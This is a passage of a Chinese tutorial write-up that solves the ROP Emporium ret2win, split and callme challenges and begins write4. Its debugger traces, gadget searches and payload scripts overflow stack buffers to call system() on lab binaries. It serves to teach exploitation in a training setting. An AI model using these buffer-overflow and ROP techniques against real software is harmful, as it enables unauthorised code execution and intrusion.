\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6709\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u901a\u5e38\u5148\u8f93\u5165\u4e00\u5b9a\u6570\u91cf\u7684\u5b57\u7b26\u586b\u6ee1\u7f13\u51b2\u533a\uff0c\u7136\u540e\u662f\u7cbe\u5fc3\u6784\u9020\u7684 ROP \u94fe\uff0c\u901a\u8fc7\u8986\u76d6\u5806\u6808\u4e0a\u4fdd\u5b58\u7684\u8fd4\u56de\u5730\u5740\u6765\u5b9e\u73b0\u51fd\u6570\u8df3\u8f6c\uff08\u5173\u4e8e\u7f13\u51b2\u533a\u6ea2\u51fa\u8bf7\u67e5\u770b\u4e0a\u4e00\u7ae0 3.1.3\u6808\u6ea2\u51fa\uff09\u3002 \u7b2c\u4e00\u4e2a\u6311\u6218\u6211\u4f1a\u5c3d\u91cf\u8be6\u7ec6\u4e00\u70b9\uff0c\u56e0\u4e3a\u6240\u6709\u6311\u6218\u7a0b\u5e8f\u90fd\u6709\u76f8\u4f3c\u7684\u7ed3\u6784\uff0c\u7f13\u51b2\u533a\u5927\u5c0f\u90fd\u4e00\u6837\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u6f0f\u6d1e\u51fd\u6570\uff1a gdb-peda$ disassemble pwnme Dump of assembler code for function pwnme: 0x080485f6 <+0>: push ebp 0x080485f7 <+1>: mov ebp,esp 0x080485f9 <+3>: sub esp,0x28 0x080485fc <+6>: sub esp,0x4 0x080485ff <+9>: push 0x20 0x08048601 <+11>: push 0x0 0x08048603 <+13>: lea eax,[ebp-0x28] 0x08048606 <+16>: push eax 0x08048607 <+17>: call 0x8048460 <memset@plt> 0x0804860c <+22>: add esp,0x10 0x0804860f <+25>: sub esp,0xc 0x08048612 <+28>: push 0x804873c 0x08048617 <+33>: call 0x8048420 <puts@plt> 0x0804861c <+38>: add esp,0x10 0x0804861f <+41>: sub esp,0xc 0x08048622 <+44>: push 0x80487bc 0x08048627 <+49>: call 0x8048420 <puts@plt> 0x0804862c <+54>: add esp,0x10 0x0804862f <+57>: sub esp,0xc 0x08048632 <+60>: push 0x8048821 0x08048637 <+65>: call 0x8048400 <printf@plt> 0x0804863c <+70>: add esp,0x10 0x0804863f <+73>: mov eax,ds:0x804a060 0x08048644 <+78>: sub esp,0x4 0x08048647 <+81>: push eax 0x08048648 <+82>: push 0x32 0x0804864a <+84>: lea eax,[ebp-0x28] 0x0804864d <+87>: push eax 0x0804864e <+88>: call 0x8048410 <fgets@plt> 0x08048653 <+93>: add esp,0x10 0x08048656 <+96>: nop 0x08048657 <+97>: leave 0x08048658 <+98>: ret End of assembler dump. gdb-peda$ disassemble ret2win Dump of assembler code for function ret2win: 0x08048659 <+0>: push ebp 0x0804865a <+1>: mov ebp,esp 0x0804865c <+3>: sub esp,0x8 0x0804865f <+6>: sub esp,0xc 0x08048662 <+9>: push 0x8048824 0x08048667 <+14>: call 0x8048400 <printf@plt> 0x0804866c <+19>: add esp,0x10 0x0804866f <+22>: sub esp,0xc 0x08048672 <+25>: push 0x8048841 0x08048677 <+30>: call 0x8048430 <system@plt> 0x0804867c <+35>: add esp,0x10 0x0804867f <+38>: nop 0x08048680 <+39>: leave 0x08048681 <+40>: ret End of assembler dump. \u51fd\u6570 pwnme() \u662f\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u51fd\u6570\uff0c\u5b83\u8c03\u7528 fgets() \u8bfb\u53d6\u4efb\u610f\u6570\u636e\uff0c\u4f46\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u53ea\u6709 40 \u5b57\u8282\uff08 0x0804864a <+84>: lea eax,[ebp-0x28] \uff0c0x28=40\uff09\uff0c\u5f53\u8f93\u5165\u5927\u4e8e 40 \u5b57\u8282\u7684\u6570\u636e\u65f6\uff0c\u5c31\u53ef\u4ee5\u8986\u76d6\u6389\u8c03\u7528\u51fd\u6570\u7684 ebp \u548c\u8fd4\u56de\u5730\u5740\uff1a gdb-peda$ pattern_create 50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' gdb-peda$ r Starting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret2win32 ret2win by ROP Emporium 32bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! > AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xffffd5c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") EBX: 0x0 ECX: 0xffffd5c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") EDX: 0xf7f90860 --> 0x0 ESI: 0xf7f8ee28 --> 0x1d1d30 EDI: 0x0 EBP: 0x41304141 ('AA0A') ESP: 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('') EIP: 0x41414641 ('AFAA') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41414641 [------------------------------------stack-------------------------------------] 0000| 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('') 0004| 0xffffd5f4 --> 0xffffd610 --> 0x1 0008| 0xffffd5f8 --> 0x0 0012| 0xffffd5fc --> 0xf7dd57c3 (<__libc_start_main+243>: add esp,0x10) 0016| 0xffffd600 --> 0xf7f8ee28 --> 0x1d1d30 0020| 0xffffd604 --> 0xf7f8ee28 --> 0x1d1d30 0024| 0xffffd608 --> 0x0 0028| 0xffffd60c --> 0xf7dd57c3 (<__libc_start_main+243>: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41414641 in ?? () gdb-peda$ pattern_offset $ebp 1093681473 found at offset: 40 gdb-peda$ pattern_offset $eip 1094796865 found at offset: 44 \u7f13\u51b2\u533a\u8ddd\u79bb ebp \u548c eip \u7684\u504f\u79fb\u5206\u522b\u4e3a 40 \u548c 44\uff0c\u8fd9\u5c31\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u5047\u8bbe\u3002 \u901a\u8fc7\u67e5\u770b\u7a0b\u5e8f\u7684\u903b\u8f91\uff0c\u867d\u7136\u6211\u4eec\u77e5\u9053 .text \u6bb5\u4e2d\u5b58\u5728\u51fd\u6570 ret2win() \uff0c\u4f46\u5728\u7a0b\u5e8f\u6267\u884c\u4e2d\u5e76\u6ca1\u6709\u8c03\u7528\u5230\u5b83\uff0c\u6211\u4eec\u8981\u505a\u7684\u5c31\u662f\u7528\u8be5\u51fd\u6570\u7684\u5730\u5740\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4f7f\u7a0b\u5e8f\u8df3\u8f6c\u5230\u8be5\u51fd\u6570\u4e2d\uff0c\u4ece\u800c\u6253\u5370\u51fa flag\uff0c\u6211\u4eec\u79f0\u8fd9\u4e00\u7c7b\u578b\u7684 ROP \u4e3a ret2text\u3002 \u8fd8\u6709\u4e00\u4ef6\u91cd\u8981\u7684\u4e8b\u60c5\u662f checksec\uff1a gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial \u8fd9\u91cc\u5f00\u542f\u4e86\u5173\u95ed\u4e86 PIE\uff0c\u6240\u4ee5 .text \u7684\u52a0\u8f7d\u5730\u5740\u662f\u4e0d\u53d8\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ret2win() \u7684\u5730\u5740 0x08048659 \u3002 payload \u5982\u4e0b\uff08\u6ce8\u8fd9\u7bc7\u6587\u7ae0\u4e2d\u7684paylaod\u6211\u4f1a\u4f7f\u7528\u591a\u79cd\u65b9\u6cd5\u6765\u5199\uff0c\u4ee5\u5c55\u793a\u5404\u79cd\u5de5\u5177\u7684\u4f7f\u7528\uff09\uff1a $ python2 -c \"print 'A'*44 + '\\x59\\x86\\x04\\x08'\" | ./ret2win32 ... > Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!} ret2win \u73b0\u5728\u662f 64 \u4f4d\u7a0b\u5e8f\uff1a gdb-peda$ disassemble pwnme Dump of assembler code for function pwnme: 0x00000000004007b5 <+0>: push rbp 0x00000000004007b6 <+1>: mov rbp,rsp 0x00000000004007b9 <+4>: sub rsp,0x20 0x00000000004007bd <+8>: lea rax,[rbp-0x20] 0x00000000004007c1 <+12>: mov edx,0x20 0x00000000004007c6 <+17>: mov esi,0x0 0x00000000004007cb <+22>: mov rdi,rax 0x00000000004007ce <+25>: call 0x400600 <memset@plt> 0x00000000004007d3 <+30>: mov edi,0x4008f8 0x00000000004007d8 <+35>: call 0x4005d0 <puts@plt> 0x00000000004007dd <+40>: mov edi,0x400978 0x00000000004007e2 <+45>: call 0x4005d0 <puts@plt> 0x00000000004007e7 <+50>: mov edi,0x4009dd 0x00000000004007ec <+55>: mov eax,0x0 0x00000000004007f1 <+60>: call 0x4005f0 <printf@plt> 0x00000000004007f6 <+65>: mov rdx,QWORD PTR [rip+0x200873] # 0x601070 <stdin@@GLIBC_2.2.5> 0x00000000004007fd <+72>: lea rax,[rbp-0x20] 0x0000000000400801 <+76>: mov esi,0x32 0x0000000000400806 <+81>: mov rdi,rax 0x0000000000400809 <+84>: call 0x400620 <fgets@plt> 0x000000000040080e <+89>: nop 0x000000000040080f <+90>: leave 0x0000000000400810 <+91>: ret End of assembler dump. gdb-peda$ disassemble ret2win Dump of assembler code for function ret2win: 0x0000000000400811 <+0>: push rbp 0x0000000000400812 <+1>: mov rbp,rsp 0x0000000000400815 <+4>: mov edi,0x4009e0 0x000000000040081a <+9>: mov eax,0x0 0x000000000040081f <+14>: call 0x4005f0 <printf@plt> 0x0000000000400824 <+19>: mov edi,0x4009fd 0x0000000000400829 <+24>: call 0x4005e0 <system@plt> 0x000000000040082e <+29>: nop 0x000000000040082f <+30>: pop rbp 0x0000000000400830 <+31>: ret End of assembler dump. \u9996\u5148\u4e0e 32 \u4f4d\u4e0d\u540c\u7684\u662f\u53c2\u6570\u4f20\u9012\uff0c64 \u4f4d\u7a0b\u5e8f\u7684\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7 RDI\u3001RSI\u3001RDX\u3001RCX\u3001R8 \u548c R9 \u4f20\u9012\u3002\u6240\u4ee5\u7f13\u51b2\u533a\u5927\u5c0f\u53c2\u6570\u901a\u8fc7 rdi \u4f20\u9012\u7ed9 fgets() \uff0c\u5927\u5c0f\u4e3a 32 \u5b57\u8282\u3002 \u800c\u4e14\u7531\u4e8e ret \u7684\u5730\u5740\u4e0d\u5b58\u5728\uff0c\u7a0b\u5e8f\u505c\u5728\u4e86 => 0x400810 <pwnme+91>: ret \u8fd9\u4e00\u6b65\uff0c\u8fd9\u662f\u56e0\u4e3a 64 \u4f4d\u53ef\u4ee5\u4f7f\u7528\u7684\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e 0x00007fffffffffff \uff0c\u5426\u5219\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 gdb-peda$ r Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win ret2win by ROP Emporium 64bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! > AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] RAX: 0x7fffffffe400 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") RBX: 0x0 RCX: 0x1f RDX: 0x7ffff7dd4710 --> 0x0 RSI: 0x7fffffffe400 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") RDI: 0x7fffffffe401 (\"AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") RBP: 0x6141414541412941 ('A)AAEAAa') RSP: 0x7fffffffe428 (\"AA0AAFAAb\") RIP: 0x400810 (<pwnme+91>: ret) R8 : 0x0 R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0) R10: 0x602260 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\\n\") R11: 0x246 R12: 0x400650 (<_start>: xor ebp,ebp) R13: 0x7fffffffe510 --> 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400809 <pwnme+84>: call 0x400620 <fgets@plt> 0x40080e <pwnme+89>: nop 0x40080f <pwnme+90>: leave => 0x400810 <pwnme+91>: ret 0x400811 <ret2win>: push rbp 0x400812 <ret2win+1>: mov rbp,rsp 0x400815 <ret2win+4>: mov edi,0x4009e0 0x40081a <ret2win+9>: mov eax,0x0 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffe428 (\"AA0AAFAAb\") 0008| 0x7fffffffe430 --> 0x400062 --> 0x1f8000000000000 0016| 0x7fffffffe438 --> 0x7ffff7a41f6a (<__libc_start_main+234>: mov edi,eax) 0024| 0x7fffffffe440 --> 0x0 0032| 0x7fffffffe448 --> 0x7fffffffe518 --> 0x7fffffffe870 (\"/home/firmy/Desktop/rop_emporium/ret2win/ret2win\") 0040| 0x7fffffffe450 --> 0x100000000 0048| 0x7fffffffe458 --> 0x400746 (<main>: push rbp) 0056| 0x7fffffffe460 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000400810 in pwnme () gdb-peda$ pattern_offset $rbp 7007954260868540737 found at offset: 32 gdb-peda$ pattern_offset AA0AAFAAb AA0AAFAAb found at offset: 40 re2win() \u7684\u5730\u5740\u4e3a 0x0000000000400811 \uff0cpayload \u5982\u4e0b\uff1a from zio import * payload = \"A\"*40 + l64(0x0000000000400811) io = zio('./ret2win') io.writeline(payload) io.read() split32 \u8fd9\u4e00\u9898\u4e5f\u662f ret2text\uff0c\u4f46\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u6709\u7684\u662f\u4e00\u4e2a usefulFunction() \u51fd\u6570\uff1a gdb-peda$ disassemble usefulFunction Dump of assembler code for function usefulFunction: 0x08048649 <+0>: push ebp 0x0804864a <+1>: mov ebp,esp 0x0804864c <+3>: sub esp,0x8 0x0804864f <+6>: sub esp,0xc 0x08048652 <+9>: push 0x8048747 0x08048657 <+14>: call 0x8048430 <system@plt> 0x0804865c <+19>: add esp,0x10 0x0804865f <+22>: nop 0x08048660 <+23>: leave 0x08048661 <+24>: ret End of assembler dump. \u5b83\u8c03\u7528 system() \u51fd\u6570\uff0c\u800c\u6211\u4eec\u8981\u505a\u7684\u662f\u7ed9\u5b83\u4f20\u9012\u4e00\u4e2a\u53c2\u6570\uff0c\u6267\u884c\u8be5\u53c2\u6570\u540e\u53ef\u4ee5\u6253\u5370\u51fa flag\u3002 \u4f7f\u7528 radare2 \u4e2d\u7684\u5de5\u5177 rabin2 \u5728 .data \u6bb5\u4e2d\u641c\u7d22\u5b57\u7b26\u4e32\uff1a $ rabin2 -z split32 ... vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt \u6211\u4eec\u53d1\u73b0\u5b58\u5728\u5b57\u7b26\u4e32 /bin/cat flag.txt \uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u5730\u5740\u4e3a 0x0804a030 \u3002 \u4e0b\u9762\u6784\u9020 payload\uff0c\u8fd9\u91cc\u5c31\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u4f7f\u7528\u8c03\u7528 system() \u51fd\u6570\u7684\u5730\u5740 0x08048657 \uff0c\u53e6\u4e00\u79cd\u662f\u4f7f\u7528 system() \u7684 plt \u5730\u5740 0x8048430 \uff0c\u5728\u524d\u9762\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 plt \u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff081.5.6\u52a8\u6001\u94fe\u63a5\uff09\uff0c\u8fd9\u91cc\u6211\u4eec\u518d\u56de\u987e\u4e00\u4e0b\uff1a \u7ed1\u5b9a\u524d\uff1a gdb-peda$ disassemble system Dump of assembler code for function system@plt: 0x08048430 <+0>: jmp DWORD PTR ds:0x804a018 0x08048436 <+6>: push 0x18 0x0804843b <+11>: jmp 0x80483f0 gdb-peda$ x/5x 0x804a018 0x804a018: 0x08048436 0x08048446 0x08048456 0x08048466 0x804a028: 0x00000000 \u7ed1\u5b9a\u540e\uff1a gdb-peda$ disassemble system Dump of assembler code for function system: 0xf7df9c50 <+0>: sub esp,0xc 0xf7df9c53 <+3>: mov eax,DWORD PTR [esp+0x10] 0xf7df9c57 <+7>: call 0xf7ef32cd <__x86.get_pc_thunk.dx> 0xf7df9c5c <+12>: add edx,0x1951cc 0xf7df9c62 <+18>: test eax,eax 0xf7df9c64 <+20>: je 0xf7df9c70 <system+32> 0xf7df9c66 <+22>: add esp,0xc 0xf7df9c69 <+25>: jmp 0xf7df9700 <do_system> 0xf7df9c6e <+30>: xchg ax,ax 0xf7df9c70 <+32>: lea eax,[edx-0x57616] 0xf7df9c76 <+38>: call 0xf7df9700 <do_system> 0xf7df9c7b <+43>: test eax,eax 0xf7df9c7d <+45>: sete al 0xf7df9c80 <+48>: add esp,0xc 0xf7df9c83 <+51>: movzx eax,al 0xf7df9c86 <+54>: ret End of assembler dump. gdb-peda$ x/5x 0x08048430 0x8048430 <system@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048440 <__libc_start_main@plt>: 0xa01c25ff \u5176\u5b9e\u8fd9\u91cc\u8bb2 plt \u4e0d\u662f\u5f88\u786e\u5207\uff0c\u56e0\u4e3a system \u4f7f\u7528\u592a\u9891\u7e41\uff0c\u5728\u6211\u4eec\u4f7f\u7528\u5b83\u4e4b\u524d\uff0c\u5b83\u5c31\u5df2\u7ecf\u7ed1\u5b9a\u4e86\uff0c\u5728\u540e\u9762\u7684\u6311\u6218\u4e2d\u6211\u4eec\u4f1a\u9047\u5230\u6ca1\u6709\u7ed1\u5b9a\u7684\u60c5\u51b5\u3002 \u4e24\u79cd payload \u5982\u4e0b\uff1a $ python2 -c \"print 'A'*44 + '\\x57\\x86\\x04\\x08' + '\\x30\\xa0\\x04\\x08'\" | ./split32 ... > ROPE{a_placeholder_32byte_flag!} from zio import * payload = \"A\"*44 payload += l32(0x08048430) payload += \"BBBB\" payload += l32(0x0804a030) io = zio('./split32') io.writeline(payload) io.read() \u6ce8\u610f \"BBBB\" \u662f\u65b0\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5982\u679c\u51fd\u6570 ret\uff0c\u5c31\u4f1a\u6267\u884c \"BBBB\" \u5904\u7684\u6307\u4ee4\uff0c\u901a\u5e38\u8fd9\u91cc\u4f1a\u653e\u7f6e\u4e00\u4e9b pop;pop;ret \u4e4b\u7c7b\u7684\u6307\u4ee4\u5730\u5740\uff0c\u4ee5\u5e73\u8861\u5806\u6808\u3002\u4ece system() \u51fd\u6570\u4e2d\u4e5f\u80fd\u770b\u51fa\u6765\uff0c\u5b83\u73b0\u5c06 esp \u51cf\u53bb 0xc\uff0c\u518d\u53d6\u5730\u5740 esp+0x10 \u5904\u7684\u6307\u4ee4\uff0c\u4e5f\u5c31\u662f \"BBBB\" \u7684\u540e\u4e00\u4e2a\uff0c\u5373\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u56e0\u4e3a system() \u662f libc \u4e2d\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u79f0\u4f5c ret2libc\u3002 split $ rabin2 -z split ... vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt \u5b57\u7b26\u4e32\u5730\u5740\u5728 0x00601060 \u3002 gdb-peda$ disassemble usefulFunction Dump of assembler code for function usefulFunction: 0x0000000000400807 <+0>: push rbp 0x0000000000400808 <+1>: mov rbp,rsp 0x000000000040080b <+4>: mov edi,0x4008ff 0x0000000000400810 <+9>: call 0x4005e0 <system@plt> 0x0000000000400815 <+14>: nop 0x0000000000400816 <+15>: pop rbp 0x0000000000400817 <+16>: ret End of assembler dump. 64 \u4f4d\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u901a\u8fc7 edi \u4f20\u9012\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u518d\u8c03\u7528\u4e00\u4e2a gadgets \u6765\u5c06\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5b58\u8fdb edi\u3002 \u6211\u4eec\u5148\u627e\u5230\u9700\u8981\u7684 gadgets\uff1a gdb-peda$ ropsearch \"pop rdi; ret\" Searching for ROP gadget: 'pop rdi; ret' in: binary ranges 0x00400883 : (b'5fc3') pop rdi; ret \u4e0b\u9762\u662f payload\uff1a $ python2 -c \"print 'A'*40 + '\\x83\\x08\\x40\\x00\\x00\\x00\\x00\\x00' + '\\x60\\x10\\x60\\x00\\x00\\x00\\x00\\x00' + '\\x10\\x08\\x40\\x00\\x00\\x00\\x00\\x00'\" | ./split ... > ROPE{a_placeholder_32byte_flag!} \u90a3\u6211\u4eec\u662f\u5426\u8fd8\u53ef\u4ee5\u7528\u524d\u9762\u90a3\u79cd\u65b9\u6cd5\u8c03\u7528 system() \u7684 plt \u5730\u5740 0x4005e0 \u5462\uff1a gdb-peda$ disassemble system Dump of assembler code for function system: 0x00007ffff7a63010 <+0>: test rdi,rdi 0x00007ffff7a63013 <+3>: je 0x7ffff7a63020 <system+16> 0x00007ffff7a63015 <+5>: jmp 0x7ffff7a62a70 <do_system> 0x00007ffff7a6301a <+10>: nop WORD PTR [rax+rax*1+0x0] 0x00007ffff7a63020 <+16>: lea rdi,[rip+0x138fd6] # 0x7ffff7b9bffd 0x00007ffff7a63027 <+23>: sub rsp,0x8 0x00007ffff7a6302b <+27>: call 0x7ffff7a62a70 <do_system> 0x00007ffff7a63030 <+32>: test eax,eax 0x00007ffff7a63032 <+34>: sete al 0x00007ffff7a63035 <+37>: add rsp,0x8 0x00007ffff7a63039 <+41>: movzx eax,al 0x00007ffff7a6303c <+44>: ret End of assembler dump. \u4f9d\u7136\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53c2\u6570\u7684\u4f20\u9012\u6ca1\u6709\u7528\u5230\u6808\uff0c\u6211\u4eec\u53ea\u9700\u628a\u5730\u5740\u76f4\u63a5\u66f4\u6539\u5c31\u53ef\u4ee5\u4e86\uff1a from zio import * payload = \"A\"*40 payload += l64(0x00400883) payload += l64(0x00601060) payload += l64(0x4005e0) io = zio('./split') io.writeline(payload) io.read() callme32 \u8fd9\u91cc\u6211\u4eec\u8981\u63a5\u89e6\u771f\u6b63\u7684 plt \u4e86\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0ccallme32 \u4ece\u5171\u4eab\u5e93 libcallme32.so \u4e2d\u5bfc\u5165\u4e09\u4e2a\u7279\u6b8a\u7684\u51fd\u6570\uff1a $ rabin2 -i callme32 | grep callme ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two \u6211\u4eec\u8981\u505a\u7684\u662f\u4f9d\u6b21\u8c03\u7528 callme_one() \u3001 callme_two() \u548c callme_three() \uff0c\u5e76\u4e14\u6bcf\u4e2a\u51fd\u6570\u90fd\u8981\u4f20\u5165\u53c2\u6570 1 \u3001 2 \u3001 3 \u3002\u901a\u8fc7\u8c03\u8bd5\u6211\u4eec\u80fd\u591f\u77e5\u9053\u51fd\u6570\u903b\u8f91\uff0c callme_one \u7528\u4e8e\u8bfb\u5165\u52a0\u5bc6\u540e\u7684 flag\uff0c\u7136\u540e\u4f9d\u6b21\u8c03\u7528 callme_two \u548c callme_three \u8fdb\u884c\u89e3\u5bc6\u3002 \u7531\u4e8e\u51fd\u6570\u53c2\u6570\u662f\u653e\u5728\u6808\u4e0a\u7684\uff0c\u4e3a\u4e86\u5e73\u8861\u5806\u6808\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a pop;pop;pop;ret \u7684 gadgets\uff1a $ objdump -d callme32 | grep -A 3 pop ... 80488a8: 5b pop %ebx 80488a9: 5e pop %esi 80488aa: 5f pop %edi 80488ab: 5d pop %ebp 80488ac: c3 ret 80488ad: 8d 76 00 lea 0x0(%esi),%esi ... \u6216\u8005\u662f add esp, 8; pop; ret \uff0c\u53cd\u6b63\u53ea\u8981\u80fd\u5e73\u8861\uff0c\u90fd\u53ef\u4ee5\uff1a gdb-peda$ ropsearch \"add esp, 8\" Searching for ROP gadget: 'add esp, 8' in: binary ranges 0x08048576 : (b'83c4085bc3') add esp,0x8; pop ebx; ret 0x080488c3 : (b'83c4085bc3') add esp,0x8; pop ebx; ret \u6784\u9020 payload \u5982\u4e0b\uff1a from zio import * payload = \"A\"*44 payload += l32(0x080485c0) payload += l32(0x080488a9) payload += l32(0x1) + l32(0x2) + l32(0x3) payload += l32(0x08048620) payload += l32(0x080488a9) payload += l32(0x1) + l32(0x2) + l32(0x3) payload += l32(0x080485b0) payload += l32(0x080488a9) payload += l32(0x1) + l32(0x2) + l32(0x3) io = zio('./callme32') io.writeline(payload) io.read() callme 64 \u4f4d\u7a0b\u5e8f\u4e0d\u9700\u8981\u5e73\u8861\u5806\u6808\u4e86\uff0c\u53ea\u8981\u5c06\u53c2\u6570\u6309\u987a\u5e8f\u4f9d\u6b21\u653e\u8fdb\u5bc4\u5b58\u5668\u4e2d\u5c31\u53ef\u4ee5\u4e86\u3002 $ rabin2 -i callme | grep callme ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two gdb-peda$ ropsearch \"pop rdi; pop rsi\" Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges 0x00401ab0 : (b'5f5e5ac3') pop rdi; pop rsi; pop rdx; ret payload \u5982\u4e0b\uff1a from zio import * payload = \"A\"*40 payload += l64(0x00401ab0) payload += l64(0x1) + l64(0x2) + l64(0x3) payload += l64(0x00401850) payload += l64(0x00401ab0) payload += l64(0x1) + l64(0x2) + l64(0x3) payload += l64(0x00401870) payload += l64(0x00401ab0) payload += l64(0x1) + l64(0x2) + l64(0x3) payload += l64(0x00401810) io = zio('./callme') io.writeline(payload) io.read() write432 \u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u5df2\u7ecf\u4e0d\u80fd\u5728\u7a0b\u5e8f\u4e2d\u627e\u5230\u53ef\u4ee5\u6267\u884c\u7684\u8bed\u53e5\u4e86\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5229\u7528 gadgets \u5c06 /bin/sh \u5199\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u4e2d\uff0c\u5982 .data \u6bb5\u4e2d\uff0c\u518d\u8c03\u7528 system() \u6267\u884c\u5b83\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002\u8981\u8ba4\u8bc6\u5230\u4e00\u4e2a\u91cd\u8981\u7684\u70b9\u662f\uff0cROP \u53ea\u662f\u4e00\u79cd\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f62\u5f0f\uff0c\u53ea\u8981\u6211\u4eec\u6709\u521b\u610f\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u6267\u884c\u8bf8\u5982\u5185\u5b58\u8bfb\u5199\u7b49\u64cd\u4f5c\u3002 \u8fd9\u79cd\u65b9\u6cd5\u867d\u7136\u597d\u7528\uff0c\u4f46\u8fd8\u662f\u8981\u8003\u8651\u6211\u4eec\u5199\u5165\u5730\u5740\u7684\u8bfb\u5199\u548c\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ca\u5b83\u80fd\u63d0\u4f9b\u7684\u7a7a\u95f4\u662f\u591a\u5c11\uff0c\u6211\u4eec\u5199\u5165\u7684\u5185\u5bb9\u662f\u5426\u4f1a\u5f71\u54cd\u5230\u7a0b\u5e8f\u6267\u884c\u7b49\u95ee\u9898\u3002\u5982\u6211\u4eec\u63a5\u4e0b\u6765\u60f3\u628a\u5b57\u7b26\u4e32\u5199\u5165 .data \u6bb5\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u5b83\u7684\u6743\u9650\u548c\u5927\u5c0f\u7b49\u4fe1\u606f\uff1a $ readelf -S write432 [Nr] Name Type Addr Off Size ES Flg Lk Inf Al ... [16] .rodata PROGBITS 080486f8 0006f8 000064 00 A 0 0 4 [25] .data PROGBITS 0804a028 001028 000008 00 WA 0 0 4 \u53ef\u4ee5\u770b\u5230 .data \u5177\u6709 WA \uff0c\u5373\u5199\u5165\uff08write\uff09\u548c\u5206\u914d\uff08alloc\uff09\u7684\u6743\u5229\uff0c\u800c .rodata \u5c31\u4e0d\u80fd\u5199\u5165\u3002 \u4f7f\u7528\u5de5\u5177 ropgadget 